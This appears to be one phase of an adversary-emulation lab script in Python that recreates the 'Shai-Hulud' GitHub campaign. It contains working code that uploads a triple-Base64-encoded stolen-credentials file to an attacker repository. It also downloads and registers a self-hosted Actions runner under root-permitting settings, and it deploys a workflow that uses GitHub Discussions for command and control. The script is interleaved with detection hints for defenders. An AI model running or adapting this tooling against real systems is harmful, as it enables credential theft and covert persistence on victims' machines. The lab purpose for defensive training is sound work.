"""
phase_4_persistence.py -- Phase 4: GitHub Actions Persistence + Discussion C2
MITRE ATT&CK: T1567.001, T1001, T1098, T1059.009, T1102.002
"""
import base64
import json
import os
import platform
import subprocess
import time
from typing import Any, Dict

import requests

from utils import (
    log_event, mark_step_complete, save_session_data, load_session_data,
    print_detection, print_error, print_info, print_link, print_value,
    print_phase_banner, print_step, print_success, print_warning,
)

PHASE_NUM = 4
PHASE_NAME = "Persistence + C2"
PHASE_DESCRIPTION = "GitHub runner + Discussion-based C2"
RUNNER_DIR = os.path.expanduser("~/.shai-hulud-runner")


def _gh(pat):
    return {"Authorization": f"token {pat}", "Accept": "application/vnd.github+json"}


def step_create_exfil_repo(config) -> Dict[str, Any]:
    """Step 4.1: Create exfil repo with campaign marker + upload triple-encoded data."""
    print_step("4.1", "Create exfiltration repository + upload stolen data")
    config.require_github_credentials()
    headers = _gh(config.github_pat)

    c2_name = f"shai-hulud-c2-lab-{int(time.time())}"

    resp = requests.post("https://api.github.com/user/repos", headers=headers,
        json={"name": c2_name, "description": "Sha1-Hulud: The Second Coming.",
              "private": True, "auto_init": True, "has_discussions": True,
              "has_issues": False, "has_projects": False, "has_wiki": False}, timeout=15)
    if resp.status_code not in (200, 201):
        print_error(f"Failed to create C2 repo: {resp.status_code}"); return {}

    repo_url = f"https://github.com/{config.github_username}/{c2_name}"
    print_success(f"C2 repository created with campaign marker")
    print_value("Repository", c2_name)
    print_value("Description", '"Sha1-Hulud: The Second Coming." (campaign marker IOC)')
    print_link("Open repository", repo_url)
    print_detection("CDR", "Repository created with known campaign marker description")
    save_session_data("c2_repo_name", c2_name)
    time.sleep(3)

    # Upload triple-encoded exfiltrated data
    exfil_path = os.path.expanduser("~/.shai-hulud-exfil/local_credentials.json")
    if os.path.exists(exfil_path):
        with open(exfil_path, "rb") as f:
            raw = f.read()
        encoded = base64.b64encode(base64.b64encode(base64.b64encode(raw)))
        triple_b64 = encoded.decode("utf-8")
        print_info(f"Triple-Base64 encoding stolen data for exfiltration")
        print_value("Original size", f"{len(raw)} bytes")
        print_value("Encoded size", f"{len(triple_b64)} characters ({len(triple_b64)/len(raw):.1f}x expansion)")

        resp = requests.put(
            f"https://api.github.com/repos/{config.github_username}/{c2_name}/contents/contents.json",
            headers=headers,
            json={"message": "update",
                  "content": base64.b64encode(triple_b64.encode()).decode()}, timeout=15)
        if resp.status_code in (200, 201):
            file_url = f"{repo_url}/blob/main/contents.json"
            print_success("Exfiltrated data uploaded to repository")
            print_link("View encoded data", file_url)
            print_info("To decode: cat contents.json | base64 -d | base64 -d | base64 -d")
            print_detection("CDR", "Large base64-encoded file uploaded to repository")
        else:
            print_warning(f"Upload failed: {resp.status_code}")
    else:
        print_warning("No exfiltrated data found at ~/.shai-hulud-exfil/local_credentials.json")
        print_info("Run step 1.2 first to generate exfiltrated data")

    mark_step_complete("4.1")
    return {"c2_repo_name": c2_name}


def step_register_runner(config) -> Dict[str, Any]:
    """Step 4.2: Download, configure, and start a real self-hosted GitHub Actions runner."""
    print_step("4.2", "Register and start self-hosted GitHub Actions runner")
    config.require_github_credentials()
    headers = _gh(config.github_pat)

    c2_name = load_session_data("c2_repo_name", "")
    if not c2_name:
        print_error("C2 repo name not found in session data. Run step 4.1 first.")
        return {}

    repo = f"{config.github_username}/{c2_name}"

    # Get registration token
    resp = requests.post(
        f"https://api.github.com/repos/{repo}/actions/runners/registration-token",
        headers=headers, timeout=15)
    if resp.status_code != 201:
        print_error(f"Failed to get registration token: {resp.status_code}"); return {}

    reg_token = resp.json().get("token", "")
    print_success(f"Runner registration token obtained")
    print_value("Token", f"{reg_token[:10]}... (expires in 1 hour)")

    # Determine architecture
    arch = platform.machine()
    if arch == "x86_64":
        runner_arch = "x64"
    elif arch == "aarch64":
        runner_arch = "arm64"
    else:
        runner_arch = "x64"

    os_name = platform.system().lower()
    runner_version = "2.322.0"
    runner_url = (
        f"https://github.com/actions/runner/releases/download/"
        f"v{runner_version}/actions-runner-{os_name}-{runner_arch}-{runner_version}.tar.gz"
    )

    # Download and install
    os.makedirs(RUNNER_DIR, exist_ok=True)

    # Check if already downloaded
    if os.path.exists(os.path.join(RUNNER_DIR, "run.sh")):
        print_info("Runner binary already downloaded (previous run)")
    else:
        print_info(f"Downloading GitHub Actions runner v{runner_version}...")
        print_value("URL", runner_url)
        try:
            dl = subprocess.run(
                ["curl", "-sL", "-o", "actions-runner.tar.gz", runner_url],
                cwd=RUNNER_DIR, timeout=120, capture_output=True, text=True)
            if dl.returncode != 0:
                print_error(f"Download failed: {dl.stderr}")
                return {}

            print_info("Extracting runner...")
            subprocess.run(["tar", "xzf", "actions-runner.tar.gz"],
                cwd=RUNNER_DIR, timeout=60, capture_output=True)
            os.remove(os.path.join(RUNNER_DIR, "actions-runner.tar.gz"))
            print_success("Runner extracted")
        except subprocess.TimeoutExpired:
            print_error("Runner download timed out"); return {}
        except Exception as exc:
            print_error(f"Runner download failed: {exc}"); return {}

    # Configure
    print_info("Configuring runner as 'SHA1HULUD'...")
    env = os.environ.copy()
    env["RUNNER_ALLOW_RUNASROOT"] = "1"

    try:
        cfg = subprocess.run(
            ["./config.sh", "--url", f"https://github.com/{repo}",
             "--token", reg_token, "--name", "SHA1HULUD",
             "--unattended", "--replace"],
            cwd=RUNNER_DIR, timeout=60, capture_output=True, text=True, env=env)
        if cfg.returncode != 0:
            print_error(f"Runner config failed: {cfg.stderr[:300]}")
            return {}
        print_success("Runner configured")
    except Exception as exc:
        print_error(f"Runner config error: {exc}"); return {}

    # Start as background process
    print_info("Starting runner in background...")
    time.sleep(5)  # Wait for GitHub broker sync
    try:
        proc = subprocess.Popen(
            ["./run.sh"],
            cwd=RUNNER_DIR,
            stdout=open(os.path.join(RUNNER_DIR, "runner.log"), "w"),
            stderr=subprocess.STDOUT,
            env=env,
            start_new_session=True,
        )
        save_session_data("runner_pid", proc.pid)
        time.sleep(5)

        # Verify it's running
        if proc.poll() is None:
            print_success(f"Runner 'SHA1HULUD' is running (PID: {proc.pid})")
            print_value("Runner name", "SHA1HULUD")
            print_value("PID", str(proc.pid))
            print_value("Log file", os.path.join(RUNNER_DIR, "runner.log"))
            print_link("Verify runner status", f"https://github.com/{repo}/settings/actions/runners")
            print_info("The runner is now connected to GitHub and waiting for workflow jobs")
        else:
            print_warning("Runner process exited unexpectedly. Check runner.log")
            print_link("Runner log", f"cat {os.path.join(RUNNER_DIR, 'runner.log')}")
    except Exception as exc:
        print_error(f"Failed to start runner: {exc}"); return {}

    print_detection("ASPM", "Self-hosted runner 'SHA1HULUD' registered from unrecognized host")
    mark_step_complete("4.2")
    return {"runner_name": "SHA1HULUD", "runner_pid": proc.pid}


def step_deploy_c2(config) -> Dict[str, Any]:
    """Step 4.3: Deploy Discussion-based C2 workflow."""
    print_step("4.3", "Deploy Discussion-based C2 workflow")
    config.require_github_credentials()
    headers = _gh(config.github_pat)

    c2_name = load_session_data("c2_repo_name", "")
    if not c2_name:
        print_error("C2 repo name not found. Run step 4.1 first."); return {}

    repo = f"{config.github_username}/{c2_name}"

    workflow = """name: Discussion Handler
on:
  discussion:
    types: [created]
jobs:
  process-discussion:
    runs-on: self-hosted
    env:
      RUNNER_TRACKING_ID: "0"
    steps:
      - uses: actions/checkout@v4
      - name: Process Discussion
        run: |
          echo "================================================"
          echo " C2 COMMAND RECEIVED VIA GITHUB DISCUSSION"
          echo "================================================"
          echo "Title: ${DISC_TITLE}"
          echo "Body:  ${DISC_BODY}"
          echo "Time:  $(date -u)"
          echo "Host:  $(hostname)"
          echo "User:  $(whoami)"
          echo "================================================"
        env:
          DISC_TITLE: ${{ github.event.discussion.title }}
          DISC_BODY: ${{ github.event.discussion.body }}
"""

    resp = requests.put(
        f"https://api.github.com/repos/{repo}/contents/.github/workflows/discussion.yml",
        headers=headers,
        json={"message": "Add discussion handler",
              "content": base64.b64encode(workflow.encode()).decode()}, timeout=15)

    if resp.status_code in (200, 201):
        print_success("C2 workflow deployed to repository")
    elif resp.status_code == 422:
        print_warning("Workflow already exists (previous run)")
    else:
        print_warning(f"Workflow deployment failed: {resp.status_code}")

    print_value("Workflow", ".github/workflows/discussion.yml")
    print_value("Trigger", "discussion:created (any new Discussion)")
    print_value("Runs on", "self-hosted (your machine via SHA1HULUD runner)")
    print_value("Persistence", 'RUNNER_TRACKING_ID: "0" disables post-job cleanup')
    print_info("")
    print_info("To test the C2 channel:")
    print_info("  1. Create a Discussion at the URL below")
    print_info('  2. Set title to "Test" and body to "whoami && hostname"')
    print_info("  3. Watch the Actions tab -- the workflow runs ON YOUR MACHINE")
    print_info("  4. Check the workflow output for your hostname and username")
    discussions_url = f"https://github.com/{repo}/discussions/new?category=general"
    actions_url = f"https://github.com/{repo}/actions"
    print_link("Create Discussion (triggers C2)", discussions_url)
    print_link("Watch Actions tab (see execution)", actions_url)
    print_detection("ASPM", "Workflow with runs-on: self-hosted and RUNNER_TRACKING_ID: 0")
    print_detection("ASPM", "Discussion-triggered workflow with expression injection potential")
    mark_step_complete("4.3")
    return {"workflow": "discussion.yml", "c2_repo": c2_name}


STEPS = [
    ("4.1", "Create exfil repo + upload stolen data", step_create_exfil_repo),
    ("4.2", "Register and start self-hosted runner", step_register_runner),
    ("4.3", "Deploy Discussion C2 workflow", step_deploy_c2),
]

def run_phase(config) -> Dict[str, Any]:
    print_phase_banner(4, "PERSISTENCE -- GitHub Runner + Discussion C2")
    results = {}
    for step_id, _, step_func in STEPS:
        try:
            results[step_id] = step_func(config)
            if not results[step_id]:
                print_warning(f"Step {step_id} returned empty, stopping phase"); break
        except RuntimeError as exc:
            print_error(str(exc)); break
    return results
